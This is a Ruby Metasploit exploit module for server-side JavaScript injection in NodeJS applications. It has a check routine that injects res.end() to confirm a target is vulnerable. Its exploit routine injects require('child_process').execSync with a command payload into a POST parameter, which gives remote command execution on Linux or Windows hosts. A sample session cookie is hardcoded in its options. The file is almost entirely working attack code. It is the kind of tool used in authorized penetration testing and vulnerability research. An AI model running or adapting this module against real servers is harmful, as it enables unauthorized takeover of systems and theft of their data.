##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
                      'Name' => 'NodeJS Server Side JavaScript Injection RCE',
                      'Description' => %q{
        This module exploits Server Side JavaScript Injection vulnerabilities in NodeJS.
      },
                      'License' => MSF_LICENSE,
                      'Author' =>
                          [
                              'Onur Karasalihoglu', # Metasploit Module
                          ],
                      'References' =>
                          [
                              ['URL', 'https://www.enforsec.com']
                          ],
                      'Targets' =>
                          [
                              ['Linux', {'Arch' => ARCH_CMD, 'Platform' => 'unix',
                                         'Payload' => {'PayloadType' => 'cmd', 'BadChars' => "\x22\x5c\x27"}}],

                              ['Windows', {'Arch' => ARCH_CMD, 'Platform' => 'win',
                                           'Payload' => {'PayloadType' => 'cmd', 'BadChars' => "\x22\x5c\x27"}}]

                          ],
                      'Privileged' => false,
                      'DisclosureDate' => 'Apr 20 2017',
                      'DefaultTarget' => 0))

    register_options(
        [
            OptString.new('TARGETURI', [true, 'Vulnerable Path', 'contributions']),
            OptString.new('PARAMETERS', [true, 'Parameters', 'preTax=PAYLOAD']),
            OptString.new('METHOD', [true, 'HTTP Method', 'POST']),
            OptString.new('CONTENT-TYPE', [true, 'Content-type HTTP Header', 'application/json']),
            OptString.new('COOKIE', [false, 'HTTP COOKIE', 'connect.sid=s%3A5OBaX-T7qAZu8iw4fTYNkE_Ya6osxYE0.SancSlp5nKjZs5DGCI9IRqqR3hI2zCH446uL589WAP4']),
        ], self.class)
  end


  def check
    random_text = rand_text_alpha(15)
    json_payload_check = "res.end('" + random_text + "');";
    res = send_request_cgi({
                               'method' => datastore['METHOD'],
                               'uri' => normalize_uri(datastore['TARGETURI']),
                               'encode_params' => false,
                               'data' => datastore['PARAMETERS'].gsub("PAYLOAD", URI::encode(json_payload_check)),
                               'headers' =>
                                   {
                                       'Cookie' => datastore['COOKIE'],
                                       'Content-Type' => datastore['CONTENT-TYPE'],
                                   }
                           })
    if res and res.body.include? random_text then
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    json_payload_exploit = "require('child_process').execSync('#{payload.encoded}')";
    send_request_cgi({
                         'method' => datastore['METHOD'],
                         'uri' => normalize_uri(datastore['TARGETURI']),
                         'encode_params' => false,
                         'data' => datastore['PARAMETERS'].gsub("PAYLOAD", json_payload_exploit),
                         'headers' =>
                             {
                                 'Cookie' => datastore['COOKIE'],
                                 'Content-Type' => datastore['CONTENT-TYPE'],
                             }
                     })
  end
end
